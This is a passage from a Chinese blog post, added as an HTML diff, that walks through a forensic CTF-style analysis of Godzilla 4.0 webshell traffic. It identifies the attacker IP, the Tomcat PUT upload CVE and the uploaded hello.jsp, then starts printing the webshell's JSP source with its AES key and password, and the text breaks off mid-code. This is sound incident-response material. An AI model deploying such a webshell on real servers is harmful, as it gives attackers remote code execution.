@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>第六章-哥斯拉4.0流量分析 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='哥斯拉 流量解密'>
+  <meta itemprop="name" content="第六章-哥斯拉4.0流量分析">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2024-11-29T23:46:20+08:00">
+  <meta itemprop="dateModified" content="2024-11-29T23:46:20+08:00">
+  <meta itemprop="wordCount" content="548">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="哥斯拉 流量解密"><meta property="og:url" content="http://localhost:1313/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="第六章-哥斯拉4.0流量分析">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-29T23:46:20+08:00">
+    <meta property="article:modified_time" content="2024-11-29T23:46:20+08:00">
+    <meta property="article:tag" content="哥斯拉 流量解密">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="第六章-哥斯拉4.0流量分析">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="第六章-哥斯拉4.0流量分析 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/%E5%AE%9E%E6%88%98-%E8%A1%8C%E4%B8%9A%E6%94%BB%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="实战-行业攻防应急响应" /><link rel="next" type="text/html" href="http://localhost:1313/java-ctf1/" title="Java-CTF(1)" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.md" title="第六章-哥斯拉4.0流量分析 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "第六章-哥斯拉4.0流量分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90\/"
+    },"genre": "posts","keywords": "哥斯拉 流量解密","wordcount":  548 ,
+    "url": "http:\/\/localhost:1313\/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90\/","datePublished": "2024-11-29T23:46:20+08:00","dateModified": "2024-11-29T23:46:20+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">第六章-哥斯拉4.0流量分析</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>第六章-哥斯拉4.0流量分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-category" title="Category - 应急响应"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 应急响应</a></span></div><div class="post-meta-line"><span title="published on 2024-11-29 23:46:20"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-11-29">2024-11-29</time></span>&nbsp;<span title="548 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="true">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1黑客的-ip-是什么">1、黑客的 ip 是什么？</a></li>
+            <li><a href="#2黑客是通过什么漏洞进入服务器的提交-cve-编号">2、黑客是通过什么漏洞进入服务器的？（提交 CVE 编号）</a></li>
+            <li><a href="#3黑客上传的木马文件名是什么提交文件名">3、黑客上传的木马文件名是什么？(提交文件名)</a></li>
+            <li><a href="#4黑客上传的木马连接密码是什么">4、黑客上传的木马连接密码是什么？</a></li>
+            <li><a href="#5黑客上传的木马解密密钥是什么">5、黑客上传的木马解密密钥是什么？</a></li>
+            <li><a href="#6黑客连接-webshell-后第一条命令是什么">6、黑客连接 webshell 后第一条命令是什么</a></li>
+            <li><a href="#7黑客连接-webshell-时查询当前-shell-的权限是什么第一条命令是什么">7、黑客连接 webshell 时查询当前 shell 的权限是什么？第一条命令是什么？</a></li>
+            <li><a href="#8黑客利用-webshell-执行命令查询服务器-linux-系统发行版本是什么">8、黑客利用 webshell 执行命令查询服务器 Linux 系统发行版本是什么？</a></li>
+            <li><a href="#9黑客利用-webshell-执行命令还查询并过滤了什么提交整条执行成功的命令">9、黑客利用 webshell 执行命令还查询并过滤了什么？（提交整条执行成功的命令）</a></li>
+            <li><a href="#10黑客留下后门的反连的-ip-和-port-是什么ipport">10、黑客留下后门的反连的 IP 和 PORT 是什么？（IP:PORT)</a></li>
+            <li><a href="#11黑客通过什么文件留下了后门">11、黑客通过什么文件留下了后门？</a></li>
+            <li><a href="#12黑客设置的后门密码是什么">12、黑客设置的后门密码是什么？</a></li>
+            <li><a href="#13黑客的恶意-dnslog-服务器地址是什么">13、黑客的恶意 dnslog 服务器地址是什么？</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h4 id="1黑客的-ip-是什么" class="heading-element"><span>1、黑客的 ip 是什么？</span>
+  <a href="#1%e9%bb%91%e5%ae%a2%e7%9a%84-ip-%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><code>http</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291826241.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291826241.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291826241.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291826241.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291826241.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291826241.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{192.168.31.190}</code></p>
+<h4 id="2黑客是通过什么漏洞进入服务器的提交-cve-编号" class="heading-element"><span>2、黑客是通过什么漏洞进入服务器的？（提交 CVE 编号）</span>
+  <a href="#2%e9%bb%91%e5%ae%a2%e6%98%af%e9%80%9a%e8%bf%87%e4%bb%80%e4%b9%88%e6%bc%8f%e6%b4%9e%e8%bf%9b%e5%85%a5%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9a%84%e6%8f%90%e4%ba%a4-cve-%e7%bc%96%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>通过观察<code>http</code>流量，发现一个 PUT 请求比较可疑，并且利用成功<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828781.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828781.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828781.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828781.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828781.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828781.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828685.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828685.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828685.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828685.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828685.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828685.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+很明显利用的是 PUT 文件上传,并且通过服务器得知是<code>tomcat</code>中间件<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291829092.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291829092.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291829092.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291829092.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291829092.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291829092.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{CVE-2017-12615}</code></p>
+<h4 id="3黑客上传的木马文件名是什么提交文件名" class="heading-element"><span>3、黑客上传的木马文件名是什么？(提交文件名)</span>
+  <a href="#3%e9%bb%91%e5%ae%a2%e4%b8%8a%e4%bc%a0%e7%9a%84%e6%9c%a8%e9%a9%ac%e6%96%87%e4%bb%b6%e5%90%8d%e6%98%af%e4%bb%80%e4%b9%88%e6%8f%90%e4%ba%a4%e6%96%87%e4%bb%b6%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>通过上面得知是<code>hello.jsp</code><br>
+<code>flag{hello.jsp}</code></p>
+<h4 id="4黑客上传的木马连接密码是什么" class="heading-element"><span>4、黑客上传的木马连接密码是什么？</span>
+  <a href="#4%e9%bb%91%e5%ae%a2%e4%b8%8a%e4%bc%a0%e7%9a%84%e6%9c%a8%e9%a9%ac%e8%bf%9e%e6%8e%a5%e5%af%86%e7%a0%81%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%</span> <span class="o">!</span><span class="ne">String</span> <span class="n">xc</span> <span class="o">=</span> <span class="s2">&#34;1710acba6220f62b&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="ne">String</span> <span class="k">pass</span> <span class="o">=</span> <span class="s2">&#34;7f0e6f&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="ne">String</span> <span class="n">md5</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="k">pass</span> <span class="o">+</span> <span class="n">xc</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">X</span> <span class="k">extends</span> <span class="n">ClassLoader</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">X</span><span class="p">(</span><span class="n">ClassLoader</span> <span class="n">z</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">super</span><span class="p">(</span><span class="n">z</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">Class</span> <span class="n">Q</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">cb</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">super</span><span class="o">.</span><span class="n">defineClass</span><span class="p">(</span><span class="n">cb</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cb</span><span class="o">.</span><span class="n">length</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">x</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">s</span><span class="p">,</span> <span class="n">boolean</span> <span class="n">m</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">javax</span><span class="o">.</span><span class="n">crypto</span><span class="o">.</span><span class="n">Cipher</span> <span class="n">c</span> <span class="o">=</span> <span class="n">javax</span><span class="o">.</span><span class="n">crypto</span><span class="o">.</span><span class="n">Cipher</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="s2">&#34;AES&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">c</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="n">m</span> <span class="err">?</span> <span class="mi">1</span> <span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="n">new</span> <span class="n">javax</span><span class="o">.</span><span class="n">crypto</span><span class="o">.</span><span class="n">spec</span><span class="o">.</span><span class="n">SecretKeySpec</span><span class="p">(</span><span class="n">xc</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(),</span> <span class="s2">&#34;AES&#34;</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">c</span><span class="o">.</span><span class="n">doFinal</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">null</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">static</span> <span class="ne">String</span> <span class="n">md5</span><span class="p">(</span><span class="ne">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">java</span><span class="o">.</span><span class="n">security</span><span class="o">.</span><span class="n">MessageDigest</span> <span class="n">m</span><span class="p">;</span>  
